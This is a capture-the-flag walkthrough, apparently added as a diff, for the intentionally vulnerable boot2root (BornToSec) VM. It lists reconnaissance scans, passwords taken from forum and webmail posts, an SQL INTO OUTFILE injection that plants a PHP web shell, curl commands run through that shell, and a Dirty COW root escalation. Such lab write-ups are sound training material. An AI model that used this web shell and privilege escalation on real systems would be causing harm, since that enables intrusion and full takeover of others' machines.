@@ -1,0 +1,136 @@
+First of all we should configure virtual machines? where first is boot2root.iso, second set it be debian.
+
+Make both of them 'Host only'
+
+Use on local machine command: nmap 192.168.56.1-255
+
+We will see:
+	Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-06 19:09 MSK
+	Nmap scan report for 192.168.56.104 (192.168.56.104)
+	Host is up (0.0058s latency).
+	Not shown: 994 closed ports
+	PORT    STATE SERVICE
+	21/tcp  open  ftp
+	22/tcp  open  ssh
+	80/tcp  open  http
+	143/tcp open  imap
+	443/tcp open  https
+	993/tcp open  imaps
+
+	Nmap done: 255 IP addresses (1 host up) scanned in 12.33 seconds
+
+Use nikto -h https://192.168.56.104
+
+	- Nikto v2.1.5
+	---------------------------------------------------------------------------
+	+ Target IP:          192.168.56.104
+	+ Target Hostname:    192.168.56.104
+	+ Target Port:        443
+	---------------------------------------------------------------------------
+	+ SSL Info:        Subject: /CN=BornToSec
+					Ciphers: ECDHE-RSA-AES256-GCM-SHA384
+					Issuer:  /CN=BornToSec
+	+ Start Time:         2021-09-06 19:28:55 (GMT3)
+	---------------------------------------------------------------------------
+	+ Server: Apache/2.2.22 (Ubuntu)
+	+ The anti-clickjacking X-Frame-Options header is not present.
+	+ Hostname '192.168.56.104' does not match certificate's CN 'BornToSec'
+	+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+	- STATUS: Completed 340 tests (~5% complete, 31.3 minutes left: currently in plugin 'Nikto Tests')
+	- STATUS: Completed 400 tests (~6% complete, 26.9 minutes left: currently in plugin 'Nikto Tests')
+	+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.20
+	+ Cookie PHPSESSID created without the secure flag
+	+ Cookie PHPSESSID created without the httponly flag
+	+ Cookie mlf2_usersettings created without the secure flag
+	+ Cookie mlf2_usersettings created without the httponly flag
+	+ Cookie mlf2_last_visit created without the secure flag
+	+ Cookie mlf2_last_visit created without the httponly flag
+	+ OSVDB-3092: /forum/: This might be interesting...
+	+ Cookie phpMyAdmin created without the httponly flag
+	+ Cookie SQMSESSID created without the secure flag
+	+ Cookie SQMSESSID created without the httponly flag
+	+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+	+ OSVDB-3093: /webmail/src/read_body.php: This might be interesting... has been seen in web logs from an unknown scanner.
+	+ Server leaks inodes via ETags, header found with file /icons/README, inode: 47542, size: 5108, mtime: 0x438c0358aae80
+	+ OSVDB-3233: /icons/README: Apache default file found.
+	+ /phpmyadmin/: phpMyAdmin directory found
+	+ 6544 items checked: 0 error(s) and 19 item(s) reported on remote host
+	+ End Time:           2021-09-06 19:33:50 (GMT3) (295 seconds)
+	---------------------------------------------------------------------------
+	+ 1 host(s) tested
+
+Go to https://192.168.56.104/forum/
+
+	Find in thread called "Probleme login ? - lmezard" lmezard's password:
+		Failed password for invalid user !q\]Ej?*5K5cy*AJ, lmezard
+
+	Or use curl -k https://192.168.56.104/forum/index.php?id=6 | grep 'port 57764'
+
+Login to the forum, go to the profile and there you can see mail address:
+	laurie@borntosec.net
+
+Go to https://192.168.56.104/webmail/
+	use laurie@borntosec.net !q\]Ej?*5K5cy*AJ
+
+Open thread with subject DB Access and there you can see db login/password:
+	root/Fg-'kKXBj87E:aJ$
+
+Go to https://192.168.56.104/phpmyadmin/ and login
+
+Do SQL-injection:
+	SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
+
+templates_c in Apache servers is a directory, where stored executable templates, where we insert our code <?php system($_GET["cmd"]); ?>
+
+If we use https://192.168.56.104/forum/templates_c/cmd.php?cmd=pwd in browser we will get /var/www/forum/templates_c
+
+Do in your terminal curl -k 'https://192.168.56.104/forum/templates_c/cmd.php?cmd=ls%20-la%20/home'
+	total 0
+	drwxrwx--x 1 www-data             root                  60 Oct 13  2015 .
+	drwxr-xr-x 1 root                 root                 220 Sep  6 18:26 ..
+	drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
+	drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
+	drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
+	drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net  60 Oct 15  2015 laurie@borntosec.net
+	dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
+	drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
+	drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
+
+Do  curl -k 'https://192.168.56.104/forum/templates_c/cmd.php?cmd=ls%20-l%20/home/LOOKATME'
+	total 1
+	-rwxr-x--- 1 www-data www-data 25 Oct  8  2015 password
+
+Do  curl -k 'https://192.168.56.104/forum/templates_c/cmd.php?cmd=cat%20/home/LOOKATME/password'
+	lmezard:G!@M6f4Eatau{sF"
+
+Login by FTP, you can use FileZillaClient
+
+Download fun file
+
+Do tar -xf fun
+
+Do inside fir ft_fun grep "" * | grep '//file[0-9]*' > ../files_num
+
+Next steps must be done outside of ft_fun
+	gcc -o sorter sorter.c
+	./sorter files_num > ft_fun.c
+
+Do some code manipulations and as result we will get this:
+	MY PASSWORD IS: Iheartpwnage
+	Now SHA-256 it and submit
+
+Do SHA256:
+	echo -n "Iheartpwnage" | shasum -a 256
+	password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+And now we use ssh to log in as 'laurie' user, cause we were using his mail
+	ssh laurie@192.168.56.104 -p 22 and use password in step before
+
+After log in create file dirty.c and put into dirty.c files content
+	Compile it gcc -pthread dirty.c -o dirty -lcrypt
+	Then run the newly create binary by either doing:
+		"./dirty" or "./dirty my-new-password"
+	Then 'su firefart' with new password
+
+firefart@BornToSecHackMe:~# id
+uid=0(firefart) gid=0(root) groups=0(root)
